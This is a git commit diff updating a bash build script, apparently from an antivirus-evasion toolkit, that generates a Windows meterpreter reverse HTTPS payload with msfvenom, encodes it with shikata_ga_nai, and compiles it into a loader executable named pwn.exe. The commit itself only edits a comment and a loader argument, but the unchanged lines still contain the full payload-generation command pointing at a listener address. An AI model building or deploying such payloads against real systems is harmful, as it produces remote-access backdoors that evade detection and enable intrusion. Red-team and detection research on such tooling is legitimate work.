e96bc547d105f11d8e12d498b2e7e66529ee054a
Daniel Sauder <daniel.sauder@web.de>
2018-02-09 12:17:42 +0100

    update build files

--- build/build_win32_meterpreter_rev_https_shikata_loadfile.sh
+++ build/build_win32_meterpreter_rev_https_shikata_loadfile.sh
@@ -1,5 +1,5 @@
 #!/bin/bash          
-# build the .exe file that loads the payload from a given text file
+# build the .exe file that loads the shellcode from a file
 # include script containing the compiler var $win32_compiler
 # you can edit the compiler in build/global_win32.sh
 # or enter $win32_compiler="mycompiler" here
@@ -7,7 +7,7 @@
 # make meterpreter reverse payload, encoded with shikata_ga_nai
 msfvenom -p windows/meterpreter/reverse_https lhost=192.168.2.103 lport=443 -e x86/shikata_ga_nai -f raw -a x86 --platform Windows > sc.bin
 # call make_avet, the -l compiles the filename into the .exe file 
-./make_bfg -l sc.bin
+./make_bfg -l
 # compile to pwn.exe file
 $win32_compiler -o pwn.exe bfg.c
 #strip pwn.exe
